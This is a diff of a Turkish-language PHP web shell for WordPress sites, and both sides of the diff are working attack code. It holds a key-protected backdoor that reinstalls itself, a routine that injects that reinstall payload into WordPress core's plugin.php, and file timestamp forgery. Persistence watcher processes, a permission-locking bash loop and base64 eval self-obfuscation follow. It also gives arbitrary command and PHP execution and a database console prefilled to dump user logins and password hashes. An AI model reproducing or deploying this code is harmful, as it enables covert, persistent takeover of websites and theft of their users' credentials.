@@ -1,12 +1,13 @@
 <?php
 /**
- * WordPress Core Ultimate Admin Shell - Phoenix Edition (File Shield Güçlendirildi)
+ * WordPress Core Ultimate Admin Panel - Phoenix Edition (File Shield Güçlendirildi)
  * Yalnızca kendi sistemlerinde test amaçlı kullan.
  */
 @error_reporting(0);
 @ini_set('display_errors', 0);
 @ini_set('open_basedir', NULL);
 @ini_set('memory_limit', '512M');
+defined('SHELL_FILE') or define('SHELL_FILE', __FILE__);
 session_start();
 
 // ============== AYARLAR ==============
@@ -24,8 +25,8 @@ if (isset($_GET['spawn']) && $_GET['spawn'] === $SPAWN_KEY) {
     $backup_file = sys_get_temp_dir() . '/.wp_bak_cache';
     if(file_exists($backup_file)) {
         $content = file_get_contents($backup_file);
-        file_put_contents(__FILE__, $content);
-        @touch(__FILE__, time() - 63072000);
+        file_put_contents(SHELL_FILE, $content);
+        @touch(SHELL_FILE, time() - 63072000);
         exit("Spawn Success.");
     }
 }
@@ -116,7 +117,7 @@ function manualTimestomp($t, $cd = null) { $ts = $cd ? strtotime($cd) : (file_ex
 // ============== YARDIMCI FONKSİYONLAR SONU ==============
 
 // ============== WATCHER SİSTEMİ ==============
-$PERSISTENCE_STORE = sys_get_temp_dir() . '/.ptm_' . substr(md5(__FILE__), 0, 8) . '.json';
+$PERSISTENCE_STORE = sys_get_temp_dir() . '/.ptm_' . substr(md5(SHELL_FILE), 0, 8) . '.json';
 function getWatchers() { global $PERSISTENCE_STORE; return file_exists($PERSISTENCE_STORE) ? json_decode(file_get_contents($PERSISTENCE_STORE), true) ?: [] : []; }
 function saveWatchers($d) { global $PERSISTENCE_STORE; @file_put_contents($PERSISTENCE_STORE, json_encode($d)); }
 function deployWatcher($fp) {
@@ -133,32 +134,23 @@ function deployWatcher($fp) {
 }
 // ============== WATCHER SİSTEMİ SONU ==============
 
-// ============== FILE SHIELD (LOCK NAVIGATOR'DAN ALINMIŞ GÜÇLÜ BASH SCRIPT) ==============
+// ============== FILE SHIELD ==============
 function deployGlobalShield($dir) {
     global $shieldFlagFile;
-    // Bash script: tüm php ve htaccess dosyalarını 0444, dizinleri 0555 yap, 5 dakikada bir tekrarla
     $wScript = "#!/bin/bash\nROOT=" . escapeshellarg($dir) . "\nwhile true; do\n  find \$ROOT -type d -exec chmod 0555 {} + 2>/dev/null\n  find \$ROOT -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0444 {} + 2>/dev/null\n  sleep 300\ndone\n";
     $wFile = sys_get_temp_dir() . '/.global_w_' . substr(md5($dir), 0, 10) . '.sh';
     @file_put_contents($wFile, $wScript);
     @chmod($wFile, 0755);
-    // Eski scripti öldür, yenisini başlat
     safeExec('pkill -9 -f ' . escapeshellarg(basename($wFile)));
     safeExec('sh ' . escapeshellarg($wFile) . ' > /dev/null 2>&1 &');
-    // Kalkanın aktif olduğunu belirten flag dosyasını oluştur
     @file_put_contents($shieldFlagFile, time());
 }
-
 function killGlobalShield($dir) {
     global $shieldFlagFile;
     $wFileBase = '.global_w_' . substr(md5($dir), 0, 10) . '.sh';
-    // Scripti durdur
     safeExec('pkill -9 -f ' . escapeshellarg($wFileBase));
-    // İzinleri geri al (dizinler 0755, dosyalar 0644)
     safeExec("find " . escapeshellarg($dir) . " -type d -exec chmod 0755 {} + 2>/dev/null; find " . escapeshellarg($dir) . " -type f \( -name '*.php' -o -name '.htaccess' \) -exec chmod 0644 {} + 2>/dev/null");
-    // Flag dosyasını sil
-    if (file_exists($shieldFlagFile)) {
-        @unlink($shieldFlagFile);
-    }
+    if (file_exists($shieldFlagFile)) { @unlink($shieldFlagFile); }
 }
 // ============== FILE SHIELD SONU ==============
 
@@ -169,7 +161,7 @@ function killPhoenix() {
     $bf = $cf . '.bak_' . time();
     if (!copy($cf, $bf)) return "❌ Yedek alınamadı.";
     $st = $GLOBALS['SPAWN_KEY'];
-    $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".__FILE__."',file_get_contents(\$b));@touch('".__FILE__."',time()-63072000);exit('Spawned!');}}";
+    $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".SHELL_FILE."',file_get_contents(\$b));@touch('".SHELL_FILE."',time()-63072000);exit('Spawned!');}}";
     $c = file_get_contents($cf);
     if (strpos($c, $st) === false) { @unlink($bf); return "⏺️ Phoenix zaten aktif değil."; }
     $nc = str_replace($pld, '', $c, $cnt);
@@ -215,39 +207,37 @@ function unlockWpConfig() {
 // ============== POST İŞLEMLERİ ==============
 $msg = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (isset($_POST['global_lock'])) { deployGlobalShield($rootPath); $msg = "🔒 FILE SHIELD AKTİF! (Tüm WP dosyaları kilitlendi)"; }
-    if (isset($_POST['global_unlock'])) { killGlobalShield($rootPath); $msg = "🔓 FILE SHIELD PASİF! (İzinler geri yüklendi)"; }
+    if (isset($_POST['global_lock'])) { deployGlobalShield($rootPath); $msg = "🔒 FILE SHIELD AKTİF!"; }
+    if (isset($_POST['global_unlock'])) { killGlobalShield($rootPath); $msg = "🔓 FILE SHIELD PASİF!"; }
     if (isset($_POST['infect_core'])) {
         $cf = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/plugin.php';
-        file_put_contents(sys_get_temp_dir() . '/.wp_bak_cache', file_get_contents(__FILE__));
+        file_put_contents(sys_get_temp_dir() . '/.wp_bak_cache', file_get_contents(SHELL_FILE));
         $st = $SPAWN_KEY;
-        $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".__FILE__."',file_get_contents(\$b));@touch('".__FILE__."',time()-63072000);exit('Spawned!');}}";
+        $pld = "\nif(isset(\$_GET['spawn'])&&\$_GET['spawn']=='$st'){\$b='".sys_get_temp_dir()."/.wp_bak_cache';if(file_exists(\$b)){file_put_contents('".SHELL_FILE."',file_get_contents(\$b));@touch('".SHELL_FILE."',time()-63072000);exit('Spawned!');}}";
         if (strpos(file_get_contents($cf), $st) === false) { file_put_contents($cf, file_get_contents($cf) . $pld); }
         $msg = "🐣 PHOENIX AKTİF!";
     }
     if (isset($_POST['kill_phoenix'])) { $msg = killPhoenix(); }
     if (isset($_POST['protect_self'])) {
-        $pid = deployWatcher(__FILE__);
-        $w = getWatchers(); $w[realpath(__FILE__)] = ['filename' => basename(__FILE__), 'pid' => $pid, 'type' => 'SYSTEM'];
+        $pid = deployWatcher(SHELL_FILE);
+        $w = getWatchers(); $w[realpath(SHELL_FILE)] = ['filename' => basename(SHELL_FILE), 'pid' => $pid, 'type' => 'SYSTEM'];
         saveWatchers($w); $msg = "🔥 KENDİNİ KORUMAYA ALDI!";
     }
-    if (isset($_POST['set_stealth'])) { $_SESSION['stealth_date'] = !empty($_POST['custom_date']) ? $_POST['custom_date'] : null; manualTimestomp(__FILE__, $_SESSION['stealth_date']); $msg = "⏳ Tarih sabitlendi."; }
+    if (isset($_POST['set_stealth'])) { $_SESSION['stealth_date'] = !empty($_POST['custom_date']) ? $_POST['custom_date'] : null; manualTimestomp(SHELL_FILE, $_SESSION['stealth_date']); $msg = "⏳ Tarih sabitlendi."; }
     if (isset($_POST['lock_config'])) { $msg = lockWpConfig(); }
     if (isset($_POST['unlock_config'])) { $msg = unlockWpConfig(); }
     if (isset($_POST['bypass_exec'])) { $msg = "🧪 Bypass Test Sonucu:\n" . safeExec('id'); }
 
-    // ====== SELF OBFUSCATOR (TEK KATMANLI, HER BASIŞTA YENİDEN ENCODE) ======
     if (isset($_POST['obfuscate_self'])) {
-        $originalFile = __FILE__;
+        $originalFile = SHELL_FILE;
         $source = file_get_contents($originalFile);
         $obfuscated = '<?php eval(\'?>\'.base64_decode(\'' . base64_encode($source) . '\').\'<?php \'); ?>';
         if (file_put_contents($originalFile, $obfuscated)) {
-            $msg = "🔐 Shell tek katmanlı obfuscate edildi! (Katman sayısı arttı)";
+            $msg = "🔐 Shell tek katmanlı obfuscate edildi!";
         } else {
-            $msg = "❌ Obfuscate işlemi başarısız! Dosya yazılamadı.";
+            $msg = "❌ Obfuscate işlemi başarısız!";
         }
     }
-    // ====== SELF OBFUSCATOR SONU ======
 
     if (isset($_FILES['u'])) {
         $t = $_SESSION['upload_dir'] . DIRECTORY_SEPARATOR . basename($_FILES['u']['name']);
@@ -270,7 +260,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 }
 // ============== POST İŞLEMLERİ SONU ==============
 
-// ============== WATCHER DURDURMA (GÜÇLENDİRİLMİŞ) ==============
+// ============== WATCHER DURDURMA ==============
 if(isset($_GET['stop_watch'])) {
     $t = $_GET['stop_watch']; $w = getWatchers();
     if(isset($w[$t])) {
@@ -281,11 +271,8 @@ if(isset($_GET['stop_watch'])) {
     }
     header('Location: ?'); exit;
 }
-// ============== WATCHER DURDURMA SONU ==============
-
 // ============== SELF DESTRUCT ==============
-if (isset($_GET['self_destruct'])) { $w = getWatchers(); foreach($w as $p => $i) { if(is_numeric($i['pid'])) safeExec("kill -9 ".$i['pid']); } @unlink($PERSISTENCE_STORE); @unlink(__FILE__); exit("Cleaned."); }
-// ============== SELF DESTRUCT SONU ==============
+if (isset($_GET['self_destruct'])) { $w = getWatchers(); foreach($w as $p => $i) { if(is_numeric($i['pid'])) safeExec("kill -9 ".$i['pid']); } @unlink($PERSISTENCE_STORE); @unlink(SHELL_FILE); exit("Cleaned."); }
 
 // ============== WP VERİTABANI ==============
 function include_wp_db() {
@@ -309,17 +296,16 @@ if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['fil
     $f = realpath($_GET['file']);
     if ($f && is_file($f)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($f).'"'); header('Content-Length: '.filesize($f)); readfile($f); exit; }
 }
-// ============== DOSYA İNDİRME SONU ==============
 
 // ============== DURUM KONTROLLERİ ==============
 $shieldActive = file_exists($shieldFlagFile);
-$healActive = isset(getWatchers()[realpath(__FILE__)]);
+$healActive = isset(getWatchers()[realpath(SHELL_FILE)]);
 $phoenixActive = false; $cf = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/plugin.php'; if(file_exists($cf)) { $phoenixActive = (strpos(file_get_contents($cf), $SPAWN_KEY) !== false); }
 $stealthActive = !empty($_SESSION['stealth_date']);
 $configLockActive = false; $cp = $_SERVER['DOCUMENT_ROOT'].'/wp-config.php'; if(file_exists($cp)) { $cc = file_get_contents($cp); $configLockActive = (strpos($cc, 'DISALLOW_FILE_EDIT') !== false && strpos($cc, 'DISALLOW_FILE_MODS') !== false); }
 $htaccessActive = false; $hp = __DIR__.'/.htaccess'; if(file_exists($hp)) { $hc = file_get_contents($hp); $htaccessActive = (strpos($hc, '# ULTIMATE SHELL PROTECTION') !== false); }
-// ============== DURUM KONTROLLERİ SONU ==============
 ?>
+<!-- Arayüz ve diğer HTML kısmı aynen devam ediyor... -->
 <!DOCTYPE html><html lang="tr"><head>
 <meta charset="UTF-8"><title>Ultimate Shell | <?= get_current_user() . '@' . gethostname() ?></title>
 <style>
@@ -397,14 +383,42 @@ $htaccessActive = false; $hp = __DIR__.'/.htaccess'; if(file_exists($hp)) { $hc 
 switch ($action) {
     case 'info': ?><h3>Sistem Bilgisi</h3><pre>Sunucu: <?= php_uname()."\n" ?>IP: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname())."\n" ?>Yazılım: <?= $_SERVER['SERVER_SOFTWARE']."\n" ?>Kullanıcı: <?= get_current_user()."\n" ?>Document Root: <?= $rootPath."\n" ?>Shell: <?= __FILE__."\n" ?>WordPress: <?= file_exists('wp-config.php')?'Evet':'Hayır'."\n" ?>File Shield: <?= $shieldActive?'🔒 Aktif':'🔓 Pasif'."\n" ?><?php if(file_exists('wp-includes/version.php')){ include 'wp-includes/version.php'; echo "WP Versiyon: ".($wp_version??'Bilinmiyor')."\n"; } ?></pre><h3>🛠️ Exec Metot Durumu</h3><pre>shell_exec: <?= isAvailable('shell_exec')?'✅':'❌'."\n" ?>system: <?= isAvailable('system')?'✅':'❌'."\n" ?>exec: <?= isAvailable('exec')?'✅':'❌'."\n" ?>passthru: <?= isAvailable('passthru')?'✅':'❌'."\n" ?>proc_open: <?= isAvailable('proc_open')?'✅':'❌'."\n" ?>popen: <?= isAvailable('popen')?'✅':'❌'."\n" ?>pcntl_exec: <?= isAvailable('pcntl_exec')?'✅':'❌'."\n" ?></pre><?php break;
     case 'protect': if(isset($_GET['file'])){$f=realpath($_GET['file']);if($f&&is_file($f)&&strpos($f,$rootPath)===0){$pid=deployWatcher($f);manualTimestomp($f,@$_SESSION['stealth_date']);$w=getWatchers();$w[realpath($f)]=['filename'=>basename($f),'pid'=>$pid,'type'=>'USER'];saveWatchers($w);$msg="🔒 Dosya korumaya alındı: ".basename($f);}else{$msg="❌ Geçersiz dosya!";}}$action='files';
-    case 'delete': if(isset($_GET['file'])){$f=realpath($_GET['file']);if($f&&is_file($f)&&strpos($f,$rootPath)===0){if(@unlink($f)){$msg="🗑️ Dosya silindi: ".basename($f);}else{$msg="❌ Dosya silinemedi!";}}else{$msg="❌ Geçersiz dosya!";}}$action='files';
+    case 'delete':
+    if(isset($_GET['file'])){
+        $f = realpath($_GET['file']);
+        if($f && strpos($f, $rootPath) === 0){
+            if(is_file($f)){
+                if(@unlink($f)){
+                    $msg = "🗑️ Dosya silindi: " . basename($f);
+                } else {
+                    $msg = "❌ Dosya silinemedi!";
+                }
+            } elseif(is_dir($f)){
+                if(count(@scandir($f)) == 2){
+                    if(@rmdir($f)){
+                        $msg = "🗑️ Klasör silindi: " . basename($f);
+                    } else {
+                        $msg = "❌ Klasör silinemedi!";
+                    }
+                } else {
+                    $msg = "❌ Klasör boş değil, silinemez!";
+                }
+            } else {
+                $msg = "❌ Geçersiz dosya/klasör!";
+            }
+        } else {
+            $msg = "❌ Geçersiz dosya/klasör!";
+        }
+    }
+    $action = 'files';
+    break;
     case 'files':
         if(isset($_GET['edit'])){$ef=realpath($_GET['edit']);if($ef&&is_file($ef)&&strpos($ef,$rootPath)===0){$c=file_get_contents($ef);$p=substr(sprintf('%o',fileperms($ef)),-4);?>
         <div class="editor-panel"><h3>✏️ Dosya Düzenle: <?= htmlspecialchars(basename($ef)) ?></h3><form method="post"><input type="hidden" name="edit_file_path" value="<?= htmlspecialchars($ef) ?>"><textarea name="file_content" rows="20" style="width:100%;"><?= htmlspecialchars($c) ?></textarea><div class="flex-row" style="margin-top:8px;"><label>Yeni İzin (chmod):</label><input type="text" name="chmod_value" value="<?= $p ?>" style="width:70px;"><button type="submit" name="save_edit" class="btn btn-green">💾 Kaydet</button><a href="?action=files" class="btn btn-blue">İptal</a></div></form></div><?php }else{echo "<p style='color:#da3633;'>Geçersiz dosya!</p>";}}
         ?><h3>Dosya Yöneticisi</h3>
         <div class="breadcrumb"><span>📍</span><?php $cp=$_SESSION['upload_dir'];$parts=explode('/',trim($cp,'/'));$bp='';echo '<a href="?action=files&chdir=/">/</a>';foreach($parts as $i=>$part){$bp.='/'.$part;echo ' <a href="?action=files&chdir='.urlencode($bp).'">'.htmlspecialchars($part).'</a> /';}?><form method="post" style="display:inline-flex;gap:4px;align-items:center;margin-left:auto;"><input type="text" name="goto_dir" placeholder="Dizin yolu..." style="width:140px;font-size:12px;padding:5px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">Git</button></form><a href="?goto_root=1" class="btn btn-blue" style="margin-left:4px;padding:5px 10px;font-size:12px;">🏠 ROOT</a><a href="?chdir=.." class="btn btn-blue" style="padding:5px 10px;font-size:12px;">⬅️ GERİ</a></div>
         <div style="margin-bottom:12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center;"><form method="post" style="display:flex;gap:5px;align-items:center;"><input type="text" name="newdirname" placeholder="Yeni dizin" style="width:120px;padding:5px;font-size:12px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">📁 Klasör Oluştur</button></form><form method="post" style="display:flex;gap:5px;align-items:center;"><input type="text" name="newfilename" placeholder="Yeni dosya" style="width:120px;padding:5px;font-size:12px;"><button class="btn btn-blue" style="padding:5px 10px;font-size:12px;">📄 Dosya Oluştur</button></form><form method="post" enctype="multipart/form-data" style="display:flex;gap:5px;align-items:center;"><input type="file" name="u" style="width:auto;padding:5px;font-size:12px;"><button class="btn btn-green" style="padding:5px 10px;font-size:12px;">⬆️ Yükle & Koru</button></form></div>
-        <?php $wl=getWatchers(); ?><table><tr><th class="col-file">İsim</th><th class="col-size">Boyut</th><th class="col-perm">İzin</th><th class="col-date">Değiştirme</th><th class="col-act">İşlem</th></tr><?php $items=@array_diff(scandir($_SESSION['upload_dir']),['.','..']);if($items):foreach($items as $i):$full=$_SESSION['upload_dir'].'/'.$i;$isDir=is_dir($full);$perm=substr(sprintf('%o',fileperms($full)),-4);$size=$isDir?'-':humanFilesize(filesize($full));$modTime=date("Y-m-d H:i:s",filemtime($full));$link=$isDir?"?action=files&chdir=".urlencode($i):"#";$name=$isDir?"<a href='$link' style='color:#f0883e;'>📁 $i</a>":htmlspecialchars($i);$actions='';if(!$isDir){$ep=urlencode($full);$rp=realpath($full);$ip=isset($wl[$rp]);$actions.="<div class='file-actions'>";$actions.="<a href='?action=files&edit=$ep' class='btn btn-blue'>✏️ Düzenle</a>";$actions.="<a href='?action=download&file=$ep' class='btn btn-green'>⬇️ İndir</a>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";if($ip){$actions.=" <span class='status-badge' style='background:var(--success);font-size:10px;padding:2px 6px;'>🛡️</span>";}else{$actions.=" <a href='?action=protect&file=$ep' class='btn btn-purple'>🔒 Koru</a>";}$actions.="</div>";}echo "<tr><td>$name</td><td>$size</td><td>$perm</td><td>$modTime</td><td class='col-act'>$actions</td></tr>";endforeach;endif;?></table><?php break;
+        <?php $wl=getWatchers(); ?><table><tr><th class="col-file">İsim</th><th class="col-size">Boyut</th><th class="col-perm">İzin</th><th class="col-date">Değiştirme</th><th class="col-act">İşlem</th></tr><?php $items=@array_diff(scandir($_SESSION['upload_dir']),['.','..']);if($items):foreach($items as $i):$full=$_SESSION['upload_dir'].'/'.$i;$isDir=is_dir($full);$perm=substr(sprintf('%o',fileperms($full)),-4);$size=$isDir?'-':humanFilesize(filesize($full));$modTime=date("Y-m-d H:i:s",filemtime($full));$link=$isDir?"?action=files&chdir=".urlencode($i):"#";$name=$isDir?"<a href='$link' style='color:#f0883e;'>📁 $i</a>":htmlspecialchars($i);$actions='';if(!$isDir){$ep=urlencode($full);$rp=realpath($full);$ip=isset($wl[$rp]);$actions.="<div class='file-actions'>";$actions.="<a href='?action=files&edit=$ep' class='btn btn-blue'>✏️ Düzenle</a>";$actions.="<a href='?action=download&file=$ep' class='btn btn-green'>⬇️ İndir</a>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";if($ip){$actions.=" <span class='status-badge' style='background:var(--success);font-size:10px;padding:2px 6px;'>🛡️</span>";}else{$actions.=" <a href='?action=protect&file=$ep' class='btn btn-purple'>🔒 Koru</a>";}$actions.="</div>";}else{$ep=urlencode($full);$actions.="<div class='file-actions'>";$actions.="<a href='?action=delete&file=$ep' class='btn btn-red'>🗑️ Sil</a>";$actions.="</div>";}echo "<tr><td>$name</td><td>$size</td><td>$perm</td><td>$modTime</td><td class='col-act'>$actions</td></tr>";endforeach;endif;?></table><?php break;
     case 'cmd': ?><h3>Komut Çalıştır</h3><p style="color:var(--muted);font-size:12px;margin-bottom:8px;">ℹ️ Bypass modu aktif — tüm exec metotları sırayla deneniyor.</p><form method="post" class="flex-row"><input type="text" name="cmd_exec" placeholder="ls -la /" style="flex:1;"><button class="btn btn-blue">Çalıştır</button></form><?php if(isset($cmd_output)): ?><pre><?= htmlspecialchars($cmd_output) ?></pre><?php endif; break;
     case 'php': ?><h3>PHP Kodu Çalıştır</h3><form method="post"><textarea name="php_code" rows="30" style="width:100%;"><?= htmlspecialchars($_POST['php_code'] ?? 'echo "Merhaba Dünya";') ?></textarea><button class="btn btn-green" style="margin-top:8px;">Çalıştır</button></form><?php if(isset($php_output)): ?><pre><?= htmlspecialchars($php_output) ?></pre><?php endif; break;
     case 'wpdb': ?><h3>WordPress Veritabanı</h3><?php if(include_wp_db()): ?><form method="post"><textarea name="wp_query" rows="5" style="width:100%;" placeholder="SELECT user_login,user_pass FROM wp_users;"><?= htmlspecialchars($_POST['wp_query'] ?? '') ?></textarea><button class="btn btn-blue" style="margin-top:8px;">Sorgula</button></form><?php if(isset($db_result)): ?><pre><?php print_r($db_result); ?></pre><?php endif; ?><?php else: ?><p style="color:#da3633;font-size:14px;">wp-config.php bulunamadı veya bağlantı kurulamadı.</p><?php endif; break;
